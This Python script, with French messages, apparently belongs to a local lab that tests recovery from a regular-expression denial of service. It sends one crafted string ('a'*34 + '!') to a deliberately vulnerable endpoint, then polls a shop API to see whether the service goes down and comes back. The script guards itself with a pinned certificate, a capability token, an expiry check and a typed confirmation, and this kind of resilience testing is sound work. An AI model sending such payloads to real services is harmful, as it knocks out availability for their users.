"""One request against the fixed, explicitly armed local REARM laboratory.

No scan, flood, Docker permission, arbitrary target, retry or payment.
Copy with run.json and ca.pem generated locally by redos_lab.py arm.
"""
import hashlib
import json
from pathlib import Path
import ssl
import time
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import build_opener, HTTPSHandler, HTTPRedirectHandler, ProxyHandler, Request

BASE = 'https://192.168.137.1'
PAYLOAD = 'a' * 34 + '!'


class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


def configuration(folder):
    data = json.loads((folder / 'run.json').read_text(encoding='utf-8'))
    ca = (folder / 'ca.pem').read_bytes()
    import re
    if (data.get('url') != BASE or not re.fullmatch('[a-f0-9]{64}', data.get('capability', ''))
            or hashlib.sha256(ca).hexdigest() != data.get('ca_sha256')
            or type(data.get('expires')) not in (int, float) or time.time() > data['expires']):
        raise ValueError('Kit expire ou incoherent : rearmer sur le PC Hote.')
    context = ssl.create_default_context(cafile=str(folder / 'ca.pem'))
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    return data, build_opener(ProxyHandler({}), NoRedirect(), HTTPSHandler(context=context))


def get(opener, path, token=None, timeout=3):
    headers = {'Authorization': 'Bearer ' + token} if token else {}
    with opener.open(Request(BASE + path, headers=headers), timeout=timeout) as response:
        raw = response.read(65537)
        if len(raw) > 65536:
            raise ValueError('Reponse excessive')
        return json.loads(raw)


def catalogue(opener):
    try:
        data = get(opener, '/api/shop/products', timeout=2)
        return isinstance(data, list) and bool(data)
    except (OSError, ValueError):
        return False


def main(folder=None):
    folder = Path(__file__).resolve().parent if folder is None else Path(folder)
    data, opener = configuration(folder)
    if not catalogue(opener):
        raise ValueError('Catalogue deja indisponible : aucun essai lance.')
    info = get(opener, '/api/shop/lab/reference?q=reference-ok')
    if info.get('lab') != 'redos_reference_v1':
        raise ValueError('Laboratoire attendu absent : aucun essai lance.')
    if input('Un seul essai sur votre laboratoire ; tapez REARM pour lancer : ').strip() != 'REARM':
        print('Annule.'); return
    start = time.monotonic()
    print('Envoi UNIQUE du texte au validateur vulnerable de laboratoire.', flush=True)
    try:
        get(opener, '/api/shop/lab/reference?' + urlencode({'q': PAYLOAD}), data['capability'])
        raise ValueError('Le calcul a termine : ne pas declarer une reprise autonome.')
    except HTTPError as exc:
        raise ValueError('Essai refuse (HTTP ' + str(exc.code) + '). Ne pas relancer.') from None
    except (URLError, TimeoutError, ConnectionError):
        print('Reponse interrompue ou expiree ; consulter aussi les preuves du PC Hote.', flush=True)
    # Polling is observation only: it cannot restart anything.
    down = False
    while time.monotonic() - start < 115:
        healthy = catalogue(opener)
        down |= not healthy
        elapsed = round(time.monotonic() - start, 1)
        print(str(elapsed) + ' s : catalogue ' + ('accessible' if healthy else 'indisponible'), flush=True)
        if down and healthy:
            print('Disponibilite revenue. Ce constat seul ne prouve pas la reparation par Ansible.')
            print('Sur le PC Hote : python scripts/redos_lab.py watch')
            return
        time.sleep(2)
    raise ValueError('Reprise non confirmee dans cette fenetre. Ne pas relancer ; verifier le PC Hote.')


if __name__ == '__main__':
    try:
        main()
    except (OSError, ValueError, KeyError, TypeError, KeyboardInterrupt) as exc:
        print('ESSAI NON VALIDE :', str(exc))
        raise SystemExit(1)
